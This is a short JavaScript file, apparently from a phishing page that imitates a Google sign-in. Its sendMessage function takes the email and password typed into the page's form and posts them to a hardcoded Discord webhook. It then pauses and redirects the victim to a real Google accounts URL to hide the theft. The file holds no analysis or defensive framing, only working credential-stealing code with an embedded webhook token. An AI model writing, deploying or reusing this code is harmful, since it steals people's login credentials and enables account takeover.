function la(src) {
    window.location=src;
}

function sendMessage() {
    function sleep(milliseconds) {
    const date = Date.now();
    let currentDate = null;
    do {
      currentDate = Date.now();
    } while (currentDate - date < milliseconds);
  }
      var request = new XMLHttpRequest();
      request.open("POST","https://discord.com/api/webhooks/1221507035141767358/rfpGiqj9qr2iJvSlPjY44moQNWcXn0Qu5BdmRtB8yzCBoWAA-EGh74ZqqYBwi7zD7gqs");
      request.setRequestHeader('Content-type', 'application/json');
      var params = {
        content: ("> **Email  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
      }
      request.send(JSON.stringify(params));
    sleep(400)
    window.location.replace("https://accounts.google.com/&ifkv=ARZ0qKJyuHBK");
}